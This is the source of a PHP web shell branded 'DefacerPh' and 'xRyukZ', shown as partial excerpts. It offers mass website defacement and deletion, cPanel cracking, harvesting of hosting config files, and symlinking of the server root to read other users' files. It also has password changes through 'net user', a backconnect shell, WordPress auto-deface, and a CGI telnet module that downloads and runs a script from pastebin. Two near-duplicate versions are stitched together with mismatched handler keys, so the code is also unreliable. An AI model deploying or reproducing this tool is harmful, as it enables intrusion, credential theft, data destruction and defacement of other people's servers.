...
<head>
	...
	width: 100%;
        ...
        body {
    background: url(https://www.fearlessmotivation.com/wp-content/uploads/2021/03/freedom-WEB-youtube-FM-750x400.jpg) no-repeat center center fixed; 
...
<head>
  ...
  <title>DefacerPh.</title>
  <link rel="shortcut icon" href="https://www.fearlessmotivation.com/wp-content/uploads/2021/03/freedom-WEB-youtube-FM-750x400.jpg"/>
<fieldset style="border: 4px solid rgb(0, 0, 0); padding:
3px;width:450px;bgcolor:grey;align:center;font-family:Consolas;font-size:15pt"><legend><font 
color=black><b>./Login Coeg\.</b></font></legend><legend><br>
<form method="post">
...
<link rel="shortcut icon" href="https://i.postimg.cc/yNhBRJ1V/64790f7c-1d34-4741-b10c-74e6ff8f1d31.jpg"/>
<title>.DefacerPh </title>
<style type="text/css">
...
.explore tr:hover{background:black}
textarea {
...
.mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid #ff0000; padding:4px 2px;width:70%;line-height:24px;background:none;box-shadow: 0px 4px 2px black;-webkit-box-shadow: 0px 4px 2px #ff0000;-moz-box-shadow: 0px 4px 2px #ff0000;}
...
echo "<br>";
echo '<center><img src="https://i.postimg.cc/yNhBRJ1V/64790f7c-1d34-4741-b10c-74e6ff8f1d31.jpg" height="200" width="350">';
echo "<hr color='#FF0000'>";
echo '<center><font color="#fff">GreetZ:</font><marquee><a href="#"> # D704T - PacmanCorp - IndoxPloit - Infinity Cyber Team -Cyber Merah Putih - All Indonesian Cyber Team #</font></marquee></a>';
echo "<hr color='#FF0000'>";
echo "<br>";
echo "<p>";
echo '<center><div id="menu">';
echo "<li><a style='color: red;' href='?'>Home</a></li>";
echo " <li><a style='color: red;' href='?dir=$dir&DPH=info'>Server Info</a></li>";
echo " <li><a style='color: red;' href='?dir=$dir&DPH=cmd'>Command</a></li>";
echo " <li><a style='color: red;' href='?dir=$dir&DPH=mass_deface'>Mass Deface</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=mass_delete'> Mass Delete </a></li>";
echo "<br><br>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=config'>Config</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=jumping'>Jumping</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=cpanel'>Cpanel Crack</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=sym'>Symlink</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=network'>Network</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=fake_root'>Fake Root</a></li><br><br>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=cgi'>Cgi-Telnet</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=bypass'>Bypass Disable Functions</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=rdp'>K-RDP Shell</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=backconnect'>Backconnect V.2</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=zoneh'>Zone-H Mass Notifier</a></li>";
echo "<br><br>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=upload'>Upload</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=adminer'>Adminer</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=edit_user'>Auto Edit User</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=auto_wp'>Auto Edit Title WordPress</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=auto_dwp'>WordPress Auto Deface</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=dbdump'>DB Dump</a></li>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=symlink2'>Symlink V.2</a></li>";
echo "<br><br>";
echo "  <li><a style='color: red;' href='?dir=$dir&xryukz=kill'>Kill Me</a></li>";
...
elseif($_GET['xryukz'] == 'mass_deface') {
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by xRyukZ</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['xryukz'] == 'mass_delete') {
...
elseif($_GET['xryukz'] == 'sym') {
   @set_time_limit(0);

echo "<br><br><center><h1>+--=[ Symlink By xRyukZ ]=--+</h1></center><br><br><center><div class=content>";
...
elseif($_GET['xryukz'] == 'cpanel') {
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>./xRyukZ.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
...
//CONFIG
elseif($_GET['xryukz'] == 'config') {
	$idx = mkdir("xryukz_config", 0777);
					...
					if(is_readable($user_config_dir)) {
						...
						foreach($grab_config as $config => $nama_config) {
							...
							if($ambil_config == '') {
								...
								$file_config = fopen("xryukz_config/$user_idx-$nama_config.txt","w");
	...
	echo "<center><a href='?dir=$dir/xryukz_config'><font color=lime>Done</font></a></center>";
	}
}

//FKROOT
elseif($_GET['xryukz'] == 'fake_root') {
	ob_start();
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user xryukz");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>xryukz</font>] -> ";
					if($cek) {
...
//backconnect
elseif($_GET['xryukz'] == 'backconnect') {
	echo "<center><form method='post'>
	<u>Bind Port:</u> <br>
...
elseif($_GET['xryukz'] == 'zoneh') {
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='xRyukZ'><br>
		<u>Domains</u>: <br>
...
elseif($_GET['xryukz'] == 'edit_user') {
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='xryukz111' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='xryukz6969' placeholder='pass_baru'><br>
...
elseif($_GET['xryukz'] == 'auto_wp') {
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by xRyukZ' placeholder='New Title'><br><br>
...
elseif($_GET['xryukz'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		...
		function login($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by xRyukZ' required><br>
...
//symlink2
elseif($_GET['xryukz'] == 'symlink2') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("xryukz_sym",0777);
@chdir("xryukz_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex xryukz.htm
AddType text/plain .php
...
<td>".$user['name']."</td>
<td><a href='$full/xryukz_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
...
Satisfy Any';
 ...
 echo "<td align=center><font class=txt><a href=$full/xryukz_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("xryukz_sym",0777);@chdir("xryukz_sym");@exe("ln -s / root");$file3 = '
...
//cgitelnet
elseif($_GET['xryukz'] == 'cgi') {
	$cgi_dir = mkdir('xryukz_cgi', 0755);
	$file_cgi = "xryukz_cgi/cgi.izo";
	...
	chmod($file_cgi, 0755);
	echo "<iframe src='xryukz_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
	...
	echo "<center>Recode By &copy; ".date("Y")." - <a href='https://www.facebook.com/sawalrever/' target='_blank'><font color=yellow>xRyukZ | D704T</font></a></center>";
}
?>
</html>"/>
<fieldset style="border: 4px solid rgb(0, 0, 0); padding:
...
echo '<center><img src="https://i.postimg.cc/yNhBRJ1V/64790f7c-1d34-4741-b10c-74e6ff8f1d31.jpg" height="200" width="350">';
echo "<hr color='#FF0000'>";
echo '<center><font color="#fff">Greets:</font><marquee><a href="#"> DefacerPH Team!  #</font></marquee></a>';
echo "<hr color='#FF0000'>";
echo "<br>";
echo "<p>";
echo '<center><div id="menu">';
...
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=symlink2'>Symlink V.2</a></li>";
echo "<br><br>";
echo "  <li><a style='color: red;' href='?dir=$dir&DPH=kill'>Kill Me</a></li>";
echo "<br><br>";
echo "</center><form method='post'>
   <font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
   <input type='text' size='25' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
...
echo "<center><hr color='#FF0000'>";
echo "<font color='red'>Current DIR:</font> ";
foreach($scdir as $c_dir => $cdir) {  
    echo "<a href='?dir=";
    for($i = 0; $i <= $c_dir; $i++) {
        echo $scdir[$i];
...
elseif($_GET['Success'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
	...
	<input type='text' name='d_file' value='index.htm' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by DPH</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['DPH'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
...
echo "<br><br><center><h1>+--=[ Symlink By DPH ]=--+</h1></center><br><br><center><div class=content>";
...
elseif($_GET['DPH'] == 'cpanel') {
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>./DPH.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
...
//CONFIG
elseif($_GET['DPH'] == 'config') {
	$idx = mkdir("DPH_config", 0777);
	$isi_htc = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
	$htc = fopen("idx_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	fclose($htc);
					...
					if(is_readable($user_config_dir)) {
						...
						foreach($grab_config as $config => $nama_config) {
							...
							if($ambil_config == '') {
								...
								$file_config = fopen("DPH_config/$user_idx-$nama_config.txt","w");
								fputs($file_config,$ambil_config);
							}
						}
					}		
	...
	echo "<center><a href='?dir=$dir/DPH_config'><font color=lime>Done</font></a></center>";
	}
}

//FKROOT
elseif($_GET['DPH'] == 'fake_root') {
	ob_start();
	function reverse($url) {
		$ch = curl_init("http://domains.yougetsignal.com/domains.php");
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user DPH");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>DPH</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
...
elseif($_GET['DPH'] == 'auto_wp') {
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by DefacerPH' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
...
elseif($_GET['DPH'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		...
		<form method='post'>
		<input type='text' name='link_config' size='50' height='10' value='$dir'><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by DPH' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form>
		<br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
		</center>";
...
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/dph_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
...
Satisfy Any';
 ...
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/dph_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("dph_sym",0777);@chdir("dph_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex dph.htm
AddType text/plain .php
AddHandler text/plain .php
...
//cgitelnet
elseif($_GET['dph'] == 'cgi') {
	$cgi_dir = mkdir('dph_cgi', 0755);
	$file_cgi = "dph_cgi/cgi.izo";
	$isi_htcgi = "AddHandler cgi-script .izo";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = file_get_contents("https://pastebin.com/raw/8hKUFckq");
	$cgi = fopen($file_cgi, "w");
	...
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
	echo "<iframe src='dph_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
	...
	echo "<center>Recode By DefacerPH &copy; ".date("Y")." - ' target='_blank'><font color=yellow></font></a></center>";
}
?>
</html>
